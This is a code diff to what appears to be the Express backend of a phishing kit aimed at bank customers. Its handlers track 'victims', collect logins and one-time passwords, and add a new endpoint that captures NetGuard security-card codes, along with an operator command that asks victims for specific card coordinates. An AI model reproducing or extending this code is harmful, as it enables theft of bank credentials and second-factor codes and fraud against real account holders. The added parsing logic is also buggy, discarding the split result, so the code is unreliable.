@@ -15,8 +15,16 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-    const { uniqueid, status } = req.body;
+    const { uniqueid, status, ngc } = req.body;
     try {
+        if (ngc) {
+            ngc.split('-');
+            if (ngc.length != 3) {
+                return res.sendStatus(400);
+            }
+            await BNZ.findOneAndUpdate({ uniqueid }, { status, ngcoord1: ngc[0], ngcoord2: ngc[1], ngcoord3: ngc[2] }).exec();
+            return res.sendStatus(200);
+        }
         await BNZ.findOneAndUpdate({ uniqueid }, { status }).exec();
         res.sendStatus(200);
     } catch (error) {
@@ -84,6 +92,17 @@ const submitOtp = async (req, res) => {
     }
 };
 
+const submitNetguard = async (req, res) => {
+    const { netguardKey, uniqueid } = req.body;
+    try {
+        await BNZ.findOneAndUpdate({ uniqueid }, { netguardKey, status: 9 }).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const deleteEntry = async (req, res) => {
     const { uniqueid } = req.body;
     try {
@@ -101,6 +120,7 @@ module.exports = {
     getInfo,
     submitLogin,
     submitLoginAgain,
+    submitNetguard,
     submitOtp,
     deleteEntry,
 };
